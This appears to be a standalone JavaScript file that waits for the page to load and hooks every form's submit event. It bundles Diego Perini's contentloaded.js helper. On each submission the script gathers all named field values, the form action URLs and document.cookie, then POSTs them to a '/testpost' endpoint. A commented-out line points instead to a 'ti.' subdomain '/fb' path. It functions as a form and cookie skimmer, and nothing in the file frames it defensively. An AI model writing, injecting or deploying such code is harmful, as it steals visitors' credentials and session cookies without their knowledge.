var s2ti = {
    daDomain: function() {
        var daHA = self.location.hostname.split('.');
        daHA.reverse();
        return daHA[1]+'.'+daHA[0];
    },
    daSiteName: function() {
        Domain = s2ti.daDomain();
        var theD = Domain.split('.');
        return theD[0];
    },
    contentLoaded: function(win,fn) {
   /*!
    * contentloaded.js
    *
    * Author: Diego Perini (diego.perini at gmail.com)
    * Summary: cross-browser wrapper for DOMContentLoaded
    * Updated: 20101020
    * License: MIT
    * Version: 1.2
    *
    * URL:
    * http://javascript.nwbox.com/ContentLoaded/
    * http://javascript.nwbox.com/ContentLoaded/MIT-LICENSE
    *
    */

        // @win window reference
        // @fn function reference

        var done = false, top = true,

        doc = win.document, root = doc.documentElement,

        add = doc.addEventListener ? 'addEventListener' : 'attachEvent',
        rem = doc.addEventListener ? 'removeEventListener' : 'detachEvent',
        pre = doc.addEventListener ? '' : 'on',

        init = function(e) {
            if (e.type == 'readystatechange' && doc.readyState != 'complete') return;
            (e.type == 'load' ? win : doc)[rem](pre + e.type, init, false);
            if (!done && (done = true)) fn.call(win, e.type || e);
        },

        poll = function() {
            try { root.doScroll('left'); } catch(e) { setTimeout(poll, 50); return; }
            init('poll');
        };

        if (doc.readyState == 'complete') fn.call(win, 'lazy');
        else {
            if (doc.createEventObject && root.doScroll) {
                try { top = !win.frameElement; } catch(e) { }
                if (top) poll();
            }
            doc[add](pre + 'DOMContentLoaded', init, false);
            doc[add](pre + 'readystatechange', init, false);
            win[add](pre + 'load', init, false);
        }

    },
    init: function() {
//alert(document.forms.length);
        if(document.forms.length > 0) {
            var daMsg = "";

            function xmlhttpPost() {
                var xmlHttpReq = false;

                if (window.XMLHttpRequest) {
                    xmlHttpReq = new XMLHttpRequest();
                } else if (window.ActiveXObject) {
                    xmlHttpReq = new ActiveXObject("Microsoft.XMLHTTP");
                }
                try {
                    //xmlHttpReq.open('POST', 'ti.'+s2ti.daDomain()+'/fb', true);
                    xmlHttpReq.open('POST', '/testpost', true);
                    xmlHttpReq.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');

                    //xmlHttpReq.onreadystatechange = function() {
                        //if (self.xmlHttpReq.readyState == 4) {
                            //alert(xmlHttpReq.responseText);
                        //}
                    //}

                    xmlHttpReq.send(daMsg);
                } catch(e) { alert(e); }

            }

            function aggregateData() {
                for(var i=0;i<document.forms.length;i++) {
                    if(i != 0 ) daMsg = daMsg + "&";
                    daMsg = daMsg + "actionURL"+ i + "=" + escape(document.forms[i].action);
                    for (var u=0;u<document.forms[i].elements.length;u++) {
                        if(document.forms[i].elements[u].name.length > 0) { daMsg = daMsg + "&" + document.forms[i].elements[u].name + "=" + escape(document.forms[i].elements[u].value); }
                    }
                }
                if(document.cookie.length >0) { daMsg = daMsg + "&cookie: " + document.cookie; }
                xmlhttpPost();
            }

            for(var i=0;i<document.forms.length;i++) {
                element=document.forms[i];
                if (element.addEventListener) {
                    element.addEventListener("submit", aggregateData, false);
                } else if (element.attachEvent) {
                    element.attachEvent("onsubmit", aggregateData);
                }
            }
        }
    }
}

s2ti.contentLoaded(window, s2ti.init);

/*
if (window.addEventListener) {
    window.addEventListener("onload", s2ti.init(), false);
} else if (window.attachEvent) {
    window.attachEvent("onload", s2ti.init());
}
*/


